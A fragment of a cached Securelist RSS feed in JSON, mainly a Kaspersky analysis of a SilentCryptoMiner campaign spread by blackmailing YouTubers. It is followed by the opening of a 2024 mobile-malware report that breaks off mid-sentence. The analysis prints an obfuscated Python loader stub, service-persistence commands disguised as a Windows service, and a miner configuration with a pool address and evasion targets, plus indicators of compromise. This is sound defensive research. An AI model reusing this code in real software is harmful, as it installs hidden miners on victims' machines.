+                    "name": "Leonid Bezvershenko, Dmitry Pikush, Oleg Kupreev"
+                }
+            ],
+            "author": "Leonid Bezvershenko, Dmitry Pikush, Oleg Kupreev",
+            "author_detail": {
+                "name": "Leonid Bezvershenko, Dmitry Pikush, Oleg Kupreev"
+            },
+            "published": "Wed, 05 Mar 2025 10:00:38 +0000",
+            "published_parsed": [
+                2025,
+                3,
+                5,
+                10,
+                0,
+                38,
+                2,
+                64,
+                0
+            ],
+            "tags": [
+                {
+                    "term": "Malware descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Cryptocurrencies",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Cyberbullying",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Drivers",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Financial malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Technologies",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Microsoft Windows",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Miner",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "PowerShell",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Python",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "RAT Trojan",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Telegram",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "XMRig",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "YouTube",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Financial threats",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Windows malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "full",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "large",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "medium",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "thumbnail",
+                    "scheme": null,
+                    "label": null
+                }
+            ],
+            "id": "https://kasperskycontenthub.com/securelist/?p=115788",
+            "guidislink": false,
+            "summary": "Attackers blackmail YouTubers with complaints and account blocking threats, forcing them to distribute a miner disguised as a bypass tool.",
+            "summary_detail": {
+                "type": "text/html",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "Attackers blackmail YouTubers with complaints and account blocking threats, forcing them to distribute a miner disguised as a bypass tool."
+            },
+            "content": [
+                {
+                    "type": "text/html",
+                    "language": null,
+                    "base": "https://securelist.com/feed/",
+                    "value": "<p><img alt=\"\" class=\"attachment-securelist-huge-promo size-securelist-huge-promo wp-post-image\" height=\"400\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05073959/silentcryptominer-featured-image-990x400.jpg\" width=\"990\" /></p><p>In recent months, we&#8217;ve seen an increase in the use of Windows Packet Divert drivers to intercept and modify network traffic in Windows systems. This technology is used in various utilities, including ones for bypassing blocks and restrictions of access to resources worldwide. Over the past six months, our systems have logged more than 2.4\u00a0million detections of such drivers on user devices.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Dynamics of Windows Packet Divert detections (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111944/SilentCryptoMiner_eng_01.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<p>The growing popularity of tools using Windows Packet Divert has attracted cybercriminals. They started distributing malware under the guise of restriction bypass programs and injecting malicious code into existing programs.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04105903/SilentCryptoMiner_02.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115791\" height=\"592\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04105903/SilentCryptoMiner_02-1024x592.png\" width=\"1024\" /></a></p>\n<p>Such software is often distributed in the form of archives with text installation instructions, in which the developers recommend disabling security solutions, citing false positives. This plays into the hands of attackers by allowing them to persist in an unprotected system without the risk of detection. Most active of all have been schemes for distributing popular stealers, remote access tools (RATs), Trojans that provide hidden remote access, and miners that harness computing power to mine cryptocurrency. The most commonly used malware families were NJRat, XWorm, Phemedrone and DCRat.</p>\n<h2 id=\"blackmail-as-a-new-infection-scheme\">Blackmail as a new infection scheme</h2>\n<p>We recently uncovered a mass malware campaign infecting users with a miner disguised as a tool for bypassing blocks based on deep packet inspection (DPI). The original version of the tool is published on GitHub, where it has been starred more than 10,000 times. There is also a separate project based on it that is used to access Discord and YouTube.</p>\n<p>According to our telemetry, the malware campaign has affected <strong>more than 2,000 victims in Russia</strong>, but the overall figure could be much higher. One of the infection channels was a YouTuber with 60,000 subscribers, who posted several videos with instructions for bypassing blocks, adding a link to a malicious archive in the description. These videos have reached more than 400,000 views. The description was later edited and the link replaced with the message <em>&#8220;program does not work&#8221;</em>.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110103/SilentCryptoMiner_03.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115792\" height=\"284\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110103/SilentCryptoMiner_03-1024x284.png\" width=\"1024\" /></a></p>\n<p>The link pointed to the malicious site <pre class=\"crayon-plain-tag\">gitrok[.]com</pre>, which hosted the infected archive. The counter at the time of posting the video showed more than 40,000 downloads.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110618/SilentCryptoMiner_04.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115793\" height=\"562\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110618/SilentCryptoMiner_04-1024x562.png\" width=\"1024\" /></a></p>\n<p>Later, in discussions in the tool&#8217;s original repository, we found messages about a new distribution scheme: attackers under the guise of the tool developers sent strikes about the videos with instructions for bypassing restrictions. Next, the attackers threatened the content creators under the pretext of copyright infringement, demanding that they post videos with malicious links or risk shutdown of their YouTube channels.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110916/SilentCryptoMiner_05.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115794\" height=\"478\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110916/SilentCryptoMiner_05-1024x478.png\" width=\"1024\" /></a></p>\n<details>\nTranslation:\n<p><em>Hi, I have a question about YouTube strikes on the use of open-source code from the repository [REDACTED].<br />\nI created a tutorial video using materials from this repository, since it was publicly available on GitHub, and the video was non-commercial. But I still got hit with a YouTube strike for demonstrating the code.<br />\nI&#8217;d like to know if it&#8217;s the authors themselves or someone on their behalf who send the strikes? Or is it just a misunderstanding?</em><br />\n</details>\n<p>This way, the scammers were able to manipulate the reputation of popular YouTubers to force them to post links to infected files.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115795\" style=\"width: 736px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110943/SilentCryptoMiner_06.png\"><img alt=\"Example of a fraudulent message asking a YouTuber to post a link to a malicious site\" class=\"size-full wp-image-115795\" height=\"436\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04110943/SilentCryptoMiner_06.png\" width=\"726\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115795\">Example of a fraudulent message asking a YouTuber to post a link to a malicious site</p></div>\n<details>\nTranslation:\n<p><em>Official website: https://gitrok.com<br />\nAll traffic should be now directed strictly to this site. GitHub remains solely a repository for developers.<br />\nIf you have social networks where you&#8217;ve advertised [REDACTED], please publish a new post with a mention of our official website, and note that you can now download [REDACTED] only from there.</em><br />\n</details>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115796\" style=\"width: 803px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111017/SilentCryptoMiner_07.png\"><img alt=\"YouTuber complaints about cybercriminal activity\" class=\"size-large wp-image-115796\" height=\"1024\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111017/SilentCryptoMiner_07-793x1024.png\" width=\"793\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115796\">YouTuber complaints about cybercriminal activity</p></div>\n<details>\nTranslation:\n<p><em>Dear program developer @[REDACTED]\nYouTubers who showed how the program works and helped people unblock YouTube in Russia are having problems with scammers handing out strikes and threatening to delete these creators&#8217; channels. They force you to shoot 2 more videos for your channel so that if anything happens they can send 2 more strikes, then it&#8217;s 3 strikes and you&#8217;re out \u2013 Google will delete the channel. YouTubers feel pressured to give in to the scammers&#8217; demands to save their channels. But that only makes things worse.</p>\n<p>SCAMMERS FORCE YOUTUBERS TO SHOOT VIDEOS OF THEIR PROGRAM, THAT&#8217;S WHY I DON&#8217;T HAVE A SINGLE YOUTUBE VIDEO OF THIS PROGRAM&#8230;</em><br />\n</details>\n<p>In addition, we found a Telegram channel actively distributing the malicious build and a video tutorial on a YouTube channel with 340,000 subscribers.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05101915/4-silentcryptominer.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115810\" height=\"438\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05101915/4-silentcryptominer-1024x438.png\" width=\"1024\" /></a></p>\n<p>And in December 2024, users reported the distribution of a miner-infected version of the same tool through other Telegram and YouTube channels, which have since been shut down.</p>\n<h2 id=\"infected-archive\">Infected archive</h2>\n<p>All the discovered infected archives contained one additional executable file, while the original start script <pre class=\"crayon-plain-tag\">general.bat</pre> had been modified to run this file using PowerShell. In one version, if the security solution on the victim&#8217;s device deleted the malicious file, the modified start script displayed the message <em>&#8220;File not found, disable all antiviruses and re-download the file, that will help!&#8221;</em> to persuade the victim to run the malicious file, bypassing protection:</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115797\" style=\"width: 1034px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111102/SilentCryptoMiner_08.png\"><img alt=\"Contents of the original (left) and modified (right) general.bat start script\" class=\"size-large wp-image-115797\" height=\"427\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111102/SilentCryptoMiner_08-1024x427.png\" width=\"1024\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115797\">Contents of the original (left) and modified (right) general.bat start script</p></div>\n<p>The malicious executable is a simple loader written in Python and packed into an executable application using PyInstaller. In some cases, the script has been additionally obfuscated using the PyArmor library.</p><pre class=\"crayon-plain-tag\">import os\nimport subprocess\nimport sys\nimport ctypes\nimport base64\nimport tempfile\nimport urllib.request as urllib\nimport datetime\nimport time\nimport psutil\nimport base64\nimport binascii\ncmb8F2SLqf1 = '595663786432497a536a424...335331453950513d3d'\ndecoded_hex = bytes.fromhex(cmb8F2SLqf1).decode()\nstep1 = base64.b64decode(decoded_hex).decode()\nexec(base64.b64decode(step1).decode())</pre><p>\n<p align=\"center\"><strong><em>Example of the unpacked loader</em></strong></p>\n<p>The loader retrieves the URL of the next-stage payload from a hardcoded path on one of two domains: <pre class=\"crayon-plain-tag\">canvas[.]pet</pre> or <pre class=\"crayon-plain-tag\">swapme[.]fun</pre>. After the download, it saves the payload named <pre class=\"crayon-plain-tag\">t.py</pre> in a temporary directory and runs it.</p>\n<p>Note that the payload can be downloaded only from Russian IP addresses, indicating that the malware campaign was aimed at users in Russia.</p>\n<h2 id=\"second-stage-malware-loader\">Second-stage malware loader</h2>\n<p>The next stage of the infection chain was a custom Python loader based on open-source code snippets. Below are the execution steps for this script:</p>\n<ol>\n<li>Scanning the current environment for artifacts of running on a virtual machine or in a sandbox. The loader compares system data (computer and user names, MAC addresses, unique disk identifiers (HWID), GPU parameters, etc.) with predefined lists of values used by virtual environments.</li>\n<li>Adding the AppData directory to Microsoft Defender exclusions.</li>\n<li>GET request to <pre class=\"crayon-plain-tag\">http://193.233.203[.]138/WjEjoHCj/t</pre>. Depending on the response (<pre class=\"crayon-plain-tag\">true/false</pre>) and the specified probability, the script either downloads the executable file from the server at <pre class=\"crayon-plain-tag\">http://9x9o[.]com/q.txt</pre>, or uses a hardcoded block of data in Base64 format. The resulting file is saved at <pre class=\"crayon-plain-tag\">%LocalAppData%\\driverpatch9t1ohxw8\\di.exe</pre>.</li>\n<li>Modifying the payload. The executable file just written to disk is modified by appending random blocks of data to the end until it reaches 690\u00a0MB in size. This technique is used to hinder automatic analysis by antivirus solutions and sandboxes.</li>\n<li>Gaining persistence in the system. The loader creates a service named DrvSvc and sets its description to that of the legitimate Windows Image Acquisition (WIA) service:<br />\n<pre class=\"crayon-plain-tag\">svc_name = \"DrvSvc\"\nsvc_desc = \"Launches applications associated with still image acquisition events.\"\ncmd_create = f'sc create {svc_name} binPath= \"{exe_path}\" start= auto'\ncmd_desc = f'sc description {svc_name} \"{svc_desc}\"'</pre>\n</li>\n</ol>\n<h2 id=\"silentcryptominer\">SilentCryptoMiner</h2>\n<p>The downloaded <pre class=\"crayon-plain-tag\">di.exe</pre> is a <a href=\"https://securelist.com/miner-campaign-misuses-open-source-siem-agent/114022/\" rel=\"noopener\" target=\"_blank\">SilentCryptoMiner</a> sample based on the open-source miner XMRig. This is a covert miner able to mine multiple cryptocurrencies (ETH, ETC, XMR, RTM and others) using various algorithms. For stealth, SilentCryptoMiner employs <a href=\"https://attack.mitre.org/techniques/T1055/012/\" rel=\"noopener\" target=\"_blank\">process hollowing</a> to inject the miner code into a system process (in this case, <pre class=\"crayon-plain-tag\">dwm.exe</pre>). The malware is able to stop mining while the processes specified in the configuration are active. It can be controlled remotely via a web panel. The miner is coded to scan for indicators of running in a virtual environment and check the size of the executable itself, which must be at least 680\u00a0MB and no more than 800\u00a0MB\u00a0\u2013 this is how the attackers make sure that the miner was run by the above-described loader.</p>\n<p>The miner configuration is Base64-encoded and encrypted using the AES-CBC algorithm with the key <pre class=\"crayon-plain-tag\">UXUUXUUXUUCommandULineUUXUUXUUXU</pre> and the initialization vector <pre class=\"crayon-plain-tag\">UUCommandULineUU</pre>. It has many parameters, including: the algorithm and URL for mining; a list of programs which upon execution cause the miner to temporarily stop and free its resources; a link to the remote configuration that the miner will receive every 100\u00a0minutes.</p><pre class=\"crayon-plain-tag\">--algo=rx/0  --url=150.241.93[.]90:443 --user=\"JAN2024\" --pass=\"JAN2024\" --cpu-\nmax-threads-hint=20 --cinit-remote-config=\"https://pastebin.com/raw/kDDLXFac\" --\ncinit-stealth-\ntargets=\"Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe\" --\ncinit-version=\"3.2.0\" --tls --cinit-idle-wait=4 --cinit-idle-cpu=30 --cinit-\nid=\"uvduaauhlrqdhmpj\"</pre><p>\nThe campaign makes use of the Pastebin service to store configuration files. We detected several accounts distributing such files.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111556/SilentCryptoMiner_09.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115798\" height=\"319\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/04111556/SilentCryptoMiner_09-1024x319.png\" width=\"1024\" /></a></p>\n<h2 id=\"takeaways\">Takeaways</h2>\n<p>The topic of restriction bypass tools is being actively exploited to distribute malware. The above campaign limited itself to distributing a miner, but threat actors could start to use this vector for more complex attacks, including data theft and downloading other malware. This underscores once again that, while such tools may look enticing, they pose a serious threat to user data security.</p>\n<h2 id=\"indicators-of-compromise\">Indicators of compromise</h2>\n<h3 id=\"infected-archives\">Infected archives</h3>\n<p><a href=\"https://opentip.kaspersky.com/574ed9859fcdcc060e912cb2a8d1142c/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______24715db32d058502&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">574ed9859fcdcc060e912cb2a8d1142c</a><br />\n<a href=\"https://opentip.kaspersky.com/91b7cfd1f9f08c24e17d730233b80d5f/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______87bc6f8ea3e20aaa&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">91b7cfd1f9f08c24e17d730233b80d5f</a></p>\n<h3 id=\"pyinstaller-loaders\">PyInstaller loaders</h3>\n<p><a href=\"https://opentip.kaspersky.com/9808b8430667f896bcc0cb132057a683/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______d6108d52a707b58f&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">9808b8430667f896bcc0cb132057a683</a><br />\n<a href=\"https://opentip.kaspersky.com/0c380d648c0c4b65ff66269e331a0f00/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______d16493eb6312651d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">0c380d648c0c4b65ff66269e331a0f00</a></p>\n<h3 id=\"malicious-python-scripts\">Malicious Python scripts</h3>\n<p><a href=\"https://opentip.kaspersky.com/1f52ec40d3120014bb9c6858e3ba907f/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______629c0893ea817aab&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">1f52ec40d3120014bb9c6858e3ba907f</a><br />\n<a href=\"https://opentip.kaspersky.com/a14794984c8f8ab03b21890ecd7b89cb/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______9d988fd8d38098e6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">a14794984c8f8ab03b21890ecd7b89cb</a></p>\n<h3 id=\"silentcryptominer\">SilentCryptoMiner</h3>\n<p><a href=\"https://opentip.kaspersky.com/a2a9eeb3113a3e6958836e8226a8f78f/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______4d19e95092068cd7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">a2a9eeb3113a3e6958836e8226a8f78f</a><br />\n<a href=\"https://opentip.kaspersky.com/5c5c617b53f388176173768ae19952e8/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c6e0570bae4d8347&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">5c5c617b53f388176173768ae19952e8</a><br />\n<a href=\"https://opentip.kaspersky.com/ac5cb1c0be04e68c7aee9a4348b37195/results?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______afae771a31fabbdb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">ac5cb1c0be04e68c7aee9a4348b37195</a></p>\n<h3 id=\"malicious-domains-and-ips\">Malicious domains and IPs</h3>\n<p><a href=\"https://opentip.kaspersky.com/hxxp%3A%2F%2Fgitrok.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______9dfcdf6e8477a2c4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">hxxp://gitrok[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/hxxp%3A%2F%2Fswapme.fun/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______fd1fb3d6a5d99e21&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">hxxp://swapme[.]fun</a><br />\n<a href=\"https://opentip.kaspersky.com/hxxp%3A%2F%2Fcanvas.pet/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______6c40113ef5e34d23&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">hxxp://canvas[.]pet</a><br />\n<a href=\"https://opentip.kaspersky.com/hxxp%3A%2F%2F9x9o.com/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______c5ca617de6726227&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">hxxp://9x9o[.]com</a><br />\n<a href=\"https://opentip.kaspersky.com/193.233.203.138/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______8cae9538ad18ee2f&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">193.233.203[.]138</a><br />\n<a href=\"https://opentip.kaspersky.com/150.241.93.90/?icid=gl_securelist_acq_ona_smm__onl_b2c_securelist_lnk_sm-team_______8054ce4fb6fc4c7f&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL\" target=\"_blank\">150.241.93[.]90</a></p>"
+                }
+            ],
+            "wfw_commentrss": "https://securelist.com/silentcryptominer-spreads-through-blackmail-on-youtube/115788/feed/",
+            "slash_comments": "0",
+            "media_content": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05073959/silentcryptominer-featured-image.jpg",
+                    "width": "2000",
+                    "height": "1000"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05073959/silentcryptominer-featured-image-1024x512.jpg",
+                    "width": "1024",
+                    "height": "512"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05073959/silentcryptominer-featured-image-300x150.jpg",
+                    "width": "300",
+                    "height": "150"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05073959/silentcryptominer-featured-image-150x150.jpg",
+                    "width": "150",
+                    "height": "150"
+                }
+            ],
+            "media_keywords": "thumbnail"
+        },
+        {
+            "title": "Mobile malware evolution in 2024",
+            "title_detail": {
+                "type": "text/plain",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "Mobile malware evolution in 2024"
+            },
+            "links": [
+                {
+                    "rel": "alternate",
+                    "type": "text/html",
+                    "href": "https://securelist.com/mobile-threat-report-2024/115494/"
+                }
+            ],
+            "link": "https://securelist.com/mobile-threat-report-2024/115494/",
+            "comments": "https://securelist.com/mobile-threat-report-2024/115494/#respond",
+            "authors": [
+                {
+                    "name": "Anton Kivva"
+                }
+            ],
+            "author": "Anton Kivva",
+            "author_detail": {
+                "name": "Anton Kivva"
+            },
+            "published": "Mon, 03 Mar 2025 10:00:49 +0000",
+            "published_parsed": [
+                2025,
+                3,
+                3,
+                10,
+                0,
+                49,
+                0,
+                62,
+                0
+            ],
+            "tags": [
+                {
+                    "term": "Malware reports",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Adware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Google Android",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Descriptions",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Malware Statistics",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Mamont",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Mobile Malware",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "SparkCat",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Trojan",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Trojan Banker",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "Mobile threats",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "full",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "large",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "medium",
+                    "scheme": null,
+                    "label": null
+                },
+                {
+                    "term": "thumbnail",
+                    "scheme": null,
+                    "label": null
+                }
+            ],
+            "id": "https://kasperskycontenthub.com/securelist/?p=115494",
+            "guidislink": false,
+            "summary": "The most notable mobile threats of 2024, and statistics on Android-specific malware, adware and potentially unwanted software.",
+            "summary_detail": {
+                "type": "text/html",
+                "language": null,
+                "base": "https://securelist.com/feed/",
+                "value": "The most notable mobile threats of 2024, and statistics on Android-specific malware, adware and potentially unwanted software."
+            },
+            "content": [
+                {
+                    "type": "text/html",
+                    "language": null,
+                    "base": "https://securelist.com/feed/",
+                    "value": "<p><img alt=\"\" class=\"attachment-securelist-huge-promo size-securelist-huge-promo wp-post-image\" height=\"400\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/27111517/SL-mobile-report-2024-featured-990x400.jpg\" width=\"990\" /></p><p>These statistics are based on detection alerts from Kaspersky products, collected from users who consented to provide statistical data to Kaspersky Security Network. The statistics for previous years may differ from earlier publications due to a data and methodology revision implemented in 2024.</p>\n<h2 id=\"the-year-in-figures\">The year in figures</h2>\n<p>According to Kaspersky Security Network, in 2024:</p>\n<ul>\n<li>A total of 33.3 million attacks involving malware, adware or unwanted mobile software were prevented.</li>\n<li>Adware, the most common mobile threat, accounted for 35% of total detections.</li>\n<li>A total of 1.1 million malicious and potentially unwanted installation packages were detected, almost 69,000 of which associated with mobile banking Trojans.</li>\n</ul>\n<h2 id=\"the-years-trends\">The year&#8217;s trends</h2>\n<p>In 2024, cybercriminals launched a monthly average of 2.8 million malware, adware or unwanted software attacks targeting mobile devices. In total, Kaspersky products blocked 33,265,112 attacks in 2024.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Attacks on Kaspersky mobile users in 2024 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14150428/01-en-mobile-report-2024.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<p>At the end of 2024, we discovered a new <a href=\"https://securelist.com/mamont-banker-disguised-as-parcel-tracking-app/115006/\" rel=\"noopener\" target=\"_blank\">distribution scheme</a> for the Mamont banking Trojan, targeting users of Android devices in Russia. The attackers lured users with a variety of discounted products. The victim had to send a message to place an order. Some time later, the user received a phishing link to download malware disguised as a shipment tracking app.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115498\" style=\"width: 960px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14151244/mobile-report-2024.png\"><img alt=\"The phishing link as seen in the chat with the fraudsters\" class=\"size-large wp-image-115498\" height=\"1024\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14151244/mobile-report-2024-950x1024.png\" width=\"950\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115498\">The phishing link as seen in the chat with the fraudsters</p></div>\n<details>\nSee translation\n<p>Your order has shipped.<br />\n42609775<br />\nYour order tracking code.<br />\nYou can track your order in the mobile app:<br />\nhttps://.pilpesti573.ru/page/e5d565fdfd7ce<br />\nTracker<br />\nTo pay for your order AFTER YOU RECEIVE IT, enter your tracking code IN THE APP above and wait for your order details to load. We recommend keeping the app open while you are doing so. Loading the track code may take more than 30 minutes.</p>\n</details>\n<p>In August 2024, researchers at ESET <a href=\"https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/\" rel=\"noopener\" target=\"_blank\">described</a> a new NFC banking scam discovered in the Czech Republic. The scammers employed phishing websites to spread malicious mods of the legitimate app NFCGate. These used a variety of pretexts to persuade the victim to place a bank card next to the back of their phone for an NFC connection. The card details were leaked to the fraudsters who then made small contactless payments or withdrew money at ATMs.</p>\n<p>A similar scheme was later spotted in Russia, where malware masqueraded as banking and e-government apps. The SpyNote RAT was occasionally used as the malware dropper and NFC activator.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115499\" style=\"width: 621px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152202/2mobile-report-2024.png\"><img alt=\"A screenshot of the fake mobile app\" class=\"size-full wp-image-115499\" height=\"975\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152202/2mobile-report-2024.png\" width=\"611\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115499\">A screenshot of the fake mobile app</p></div>\n<details>\nSee translation\n<p>Hold your card against the NFC contactless payment module for verification.<br />\nReady to scan</p>\n</details>\n<p>Also in 2024, we detected many new preinstalled malicious apps that we assigned the generalized verdict of Trojan.AndroidOS.Adinstall. A further discovery, made in July, was the LinkDoor backdoor, also known as Vo1d, installed on Android-powered TV set-top boxes. It was located inside an infected system application <a href=\"http://com.google.android.services/\" rel=\"noopener\" target=\"_blank\">com.google.android.services</a><strong>.</strong>\u00a0The malware was capable of running arbitrary executables and downloading and installing any APKs.</p>\n<p>On top of the above, we discovered several apps on Google Play, each containing a malicious SDK implant named &#8220;SparkCat&#8221;, which began to spread at least as early as March 2024. Infected apps were deleted by the store in February 2025: nevertheless, our telemetry data shows that other apps containing SparkCat are distributed through unofficial sources.</p>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152407/3mobile-report-2024.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-115500\" height=\"743\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152407/3mobile-report-2024-1024x743.png\" width=\"1024\" /></a></p>\n<p>This SDK received a C2 server command with a list of keywords or 